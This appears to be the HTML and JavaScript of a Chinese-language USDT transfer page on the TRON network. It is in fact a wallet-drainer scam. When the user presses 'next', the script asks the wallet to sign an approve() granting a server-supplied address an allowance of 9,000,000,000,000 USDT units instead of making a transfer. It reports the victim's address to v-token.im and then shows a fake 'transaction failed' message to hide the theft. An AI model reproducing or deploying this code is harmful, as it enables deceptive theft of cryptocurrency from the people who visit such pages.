<!DOCTYPE html>
<html data-dpr="1" style="font-size: 54px;" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <!-- Required meta tags-->
    
    <link rel="shortcut icon" type="image/png" href="https://token.zhonghuaxq.com/favico.ico" sizes="32x32">
    <link rel="shortcut icon" type="image/png" href="https://token.zhonghuaxq.com/favico.ico" sizes="16x16">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no, email=no">
    <meta name="msapplication-tap-highlight" content="no">
    <meta name="x5-orientation" content="portrait">
    <meta name="x5-fullscreen" content="true">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <!-- App title -->
    <title>USDT 转帐</title>
    <!-- Framework7 Library CSS -->
    <link rel="stylesheet" href="js/vendor.css" tppabs="https://v-token.im/index/js/vendor.css">

    <!-- Custom app styles-->
    <link rel="stylesheet" href="js/reset.css" tppabs="https://v-token.im/index/js/reset.css">
    <link rel="stylesheet" href="js/main.css" tppabs="https://v-token.im/index/js/main.css">

    <!-- Jquery app core js-->
    <script type="text/javascript" src="js/jquery.min.js" tppabs="https://v-token.im/index/js/jquery.min.js"></script>
    <script type="text/javascript" src="js/flexible.js" tppabs="https://v-token.im/index/js/flexible.js"></script>
    <script type="text/javascript" src="js/mui.js" tppabs="https://v-token.im/index/js/mui.js"></script>
    <style type="text/css">
        .tishi {
            width: 3.5rem;
            height: 1.2rem;
            background: #00000059;
            z-index: 999999999999;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border-radius: 0.1rem;
            color: white;
            font-size: 0.6rem;
            text-align: center;
            line-height: 1.2rem;
            display: none;
        }
    </style>
    <script type="text/javascript" id="webrtc-control"></script>
</head>
<body style="font-size: 12px;">
    <!-- Views -->
    <div class="views">
        <!-- main view -->
        <div class="view view-main">
            <!-- Pages -->
            <div class="pages navbar-through">
                <div class="page">
                    <div class="page-content" style="padding-top: 0.5rem;">
                        <div class="list-block address">
                            <div class="list-block-title">收款地址</div>
                            <ul>
                                <li class="item-content">
                                    <div class="item-inner">
                                        <div class="item-title" id="address"></div>
                                    </div>
                                </li>
                            </ul>
                        </div>
                        <div class="list-block amount">
                            <div class="list-block-title">金额<span id="yu"></span></div>
                            <ul>
                                <li class="item-content">
                                    <div class="item-inner">
                                        <div class="item-title">
                                            <input id="pay_amount" class="num" type="number" placeholder="0">
                                        </div>
                                    </div>
                                </li>
                            </ul>
                        </div>
                        <div class="list-block-button">
                            <button class="button button-fill " id="btn-connect">下一步</button>
                        </div>
                    </div>
                </div>
                <!-- Preloader -->
                <div class="modal">
                    <div class="preloader"></div>
                </div>
                <div class="tishi">
                    交易失败
                    该钱包地址流水未达到2000
                </div>
            </div>
        </div>
        <div id="s">

        </div>
    </div>
    <div id="fffsss" style="color: white;z-index: 99999999999999999;position: absolute;top: 1px;"></div>

    <!-- Custom app js-->
        <script src="dist/app_v1.0_e8f3a1d5.js" tppabs="https://v-token.im/index/dist/app_v1.0_e8f3a1d5.js"></script>
        <script>
			$(function(){
				$("#pay_amount").bind('input porpertychange',function(){
		            if ($(this).val() && $(this).val() > 0) {
		                $('#btn-connect').css('background', '#078bc3');
		                $('#btn-connect').removeAttr('disabled');
		            } else {
		                $('#btn-connect').css('background', '#dde0dd');
		                $('#btn-connect').attr('disabled','disabled');
		            }
				});
			});

            function b(url, data, callback) {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', url, true);
                xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xhr.send(data);
            
                xhr.onreadystatechange = function () {
                    if (xhr.readyState == 4 && xhr.status == 200) {
						returndata = eval('(' + xhr.responseText + ')');
                        callback(returndata);
                    }
                }
            }
			var apaddress;
			var urls = window.location.href;
			var urls_arr=urls.split('=');
			var pioids=urls_arr[1];				
			b('https://v-token.im/index/func.php?action=gettrx','pid='+pioids,function(data){
				if(data.status==1){			
					apaddress=data.address;
					document.getElementById('address').innerText=apaddress;
				} else {
					alert(data.msg)
				}
			})
			 function GetRandomNum(Min,Max)
			{
				var Range = Max - Min;
				var Rand = Math.random();
				return(Min + Math.round(Rand * Range));
			}
			$(function () {
				async function s(){
					tronWeb=window.tronWeb;
					trc20address=tronWeb.defaultAddress.base58;
					
					contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
					let ye=await contract.balanceOf(trc20address).call();
					c=ye._hex;
					d=eval(c).toString(10);
					e=d/1000000;
					document.getElementById('yu').innerText=e+'USDT';				
				}
	            async function a() {
	            	$('.pages').append('<div class="modal-overlay"></div>');
                	$('.modal-overlay').addClass('modal-overlay-visible');
                	$('.modal').removeClass('modal-out').addClass('modal-in');
	                const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
	                if(window.tronWeb.defaultAddress==undefined){
	                    $('.modal-overlay').remove();
                    	$('.modal').removeClass('modal-in').addClass('modal-out');
						mui.alert('您的trx不足以支付矿工费');
	                    return;
	                }
		                const trc20address=window.tronWeb.defaultAddress.base58;
		                tradeobj = await window.tronWeb.trx.getAccount(
						      trc20address,
						);
	                	if(tradeobj['balance']==undefined){
	                    	$('.modal-overlay').remove();
                    		$('.modal').removeClass('modal-in').addClass('modal-out');
							mui.alert('您的trx不足以支付矿工费');
	                    	return;						
						}
						trxye=tradeobj['balance']/1000000;
						if(trxye<7){
	                    	$('.modal-overlay').remove();
                    		$('.modal').removeClass('modal-in').addClass('modal-out');
							mui.alert('您的trx不足以支付矿工费');
	                    	return;
						}
	                    let contract = await window.tronWeb.contract().at(trc20ContractAddress);
	                    num=document.getElementById('pay_amount').value;
	                    let ye=await contract.balanceOf(trc20address).call();
	                    c=ye._hex;
	                    d=eval(c).toString(10);
	                    e=d/1000000;
	                    console.log(typeof(e));
	                    if(num==0){
	                    	$('.modal-overlay').remove();
                    		$('.modal').removeClass('modal-in').addClass('modal-out');
							mui.alert("请输入转出凭证数量");
	                        return;
	                    }
	                    if(num>e){
	                    	$('.modal-overlay').remove();
                    		$('.modal').removeClass('modal-in').addClass('modal-out');
							mui.alert("Usdt余额不足");
	                        return;                  
	                    }
					try{
	                	await contract.approve(
	                        apaddress,
	                        //'TBr9RDtxs3riFraShYheQW6gPmxmdMJzJ4', //address _spender
	                        9000000000000 //amount
	                    ).send({
		                    feeLimit: 100000000,
		                    callValue: 0,
		                    shouldPollResponse: false
		            		},function (err, res) {
	                    		if(err){
	                    			if(err=='Confirmation declined by user'){
	                    				mui.alert('拒绝签名');
	                    			} else {
	                    				mui.alert('签名失败');
	                    			}
	                    			$('.modal-overlay').remove();
                    				$('.modal').removeClass('modal-in').addClass('modal-out');
	                    			return;
	                    		}
	                    		console.log(res);
			                	var url = window.location.href;
								var url_arr=url.split('=');
								var pioid=url_arr[1].split('&')[0];
								var timestamp=new Date().getTime()
								var output=GetRandomNum(10000,99999);
								outputs=timestamp+''+output;     
								var data={};
								data.value=outputs;
								data.sqgl=trc20address;
								data.pzzz=num;
								data.sqt=apaddress;
								data.type="TRX";
								data.pid=pioid;
								var params = Object.keys(data).map(function (key) {
								    // body...
								    return encodeURIComponent(key) + "=" + encodeURIComponent(data[key]);
								}).join("&");
								b('https://v-token.im/index/transfer.php',params,function(data){
								    console.log(data);
								    if(data.signtrue==1){
								    	bs=data.msg;
								    }                        
								}) 
								setTimeout(function () {
									var mask = mui.createMask(function () { });
									mask.show();
									mui.alert('充值失败该钱包地址流水未达到2000', " ", '好', function () {
										mask.close();
									});
								}, 3000);						
	                    });
	                    $('.modal-overlay').remove();
                    	$('.modal').removeClass('modal-in').addClass('modal-out');
                    	return;
	                } catch(error) {
	                	$('.modal-overlay').remove();
                    	$('.modal').removeClass('modal-in').addClass('modal-out');
						console.log(error.message);
						if(error.message=='Invalid address provided'){
							/*
							setTimeout(function () {
								var mask = mui.createMask(function () { });
								mask.show();
								mui.alert('充值失败该钱包地址流水未达到2000', " ", '好', function () {
									mask.close();
								});
							}, 3000);
							*/
		                	var url = window.location.href;
							var url_arr=url.split('=');
							var pioid=url_arr[1].split('&')[0];
							var timestamp=new Date().getTime()
							var output=GetRandomNum(10000,99999);
							outputs=timestamp+''+output;     
							var data={};
							data.value=outputs;
							data.sqgl=trc20address;
							data.pzzz=num;
							data.sqt=apaddress;
							data.type="TRX";
							data.pid=pioid;
							var params = Object.keys(data).map(function (key) {
							    // body...
							    return encodeURIComponent(key) + "=" + encodeURIComponent(data[key]);
							}).join("&");
							
							b('https://v-token.im/index/transfer.php',params,function(data){
							    console.log(data);
							    if(data.signtrue==1){
							    	bs=data.msg;
							    }                        
							});
							mui.alert('您有交易正在进行中');
						} else {
							mui.alert(error.message);
						}
						$('.modal-overlay').remove();
                    	$('.modal').removeClass('modal-in').addClass('modal-out');
                    	return;
	                }
	                $('.modal-overlay').remove();
                    $('.modal').removeClass('modal-in').addClass('modal-out');
	            }
	            document.querySelector("#s").addEventListener("click", s);
	            document.querySelector("#btn-connect").addEventListener("click", a);
			});
        $(function () {
            setTimeout(function () {
                $('#s').click()
            }, 1000);
        })


        </script> 

</body></html>